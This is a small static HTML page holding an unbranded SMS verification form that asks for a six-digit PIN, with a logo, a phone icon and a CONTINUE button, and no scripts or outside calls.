<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, minimum-scale=1, user-scalable=no">
  <link rel="stylesheet" href="css/style-sms.css">
  <title>Form</title>
</head>
<body>
  <main>
    <section class="section">
      <div class="container">
          <div class="logo">
          <img src="image/logo_1.png" alt="logo" class="img">
        </div>
        <form action="#" method="POST" class="form">
          <div class="cell">
            <img src="image/img.png" alt="tel">
          </div>
          <p class="text">Enter the PIN you received by SMS</p>
          <label class="label">
            <input type="text" name="kod" minlength="6" maxlength="6" pattern="[0-9]{6}?" class="input" required>
          </label>
          <button class="btn">CONTINUE</button>
        </form>
      </div>
    </section>
  </main>
</body>
</html>
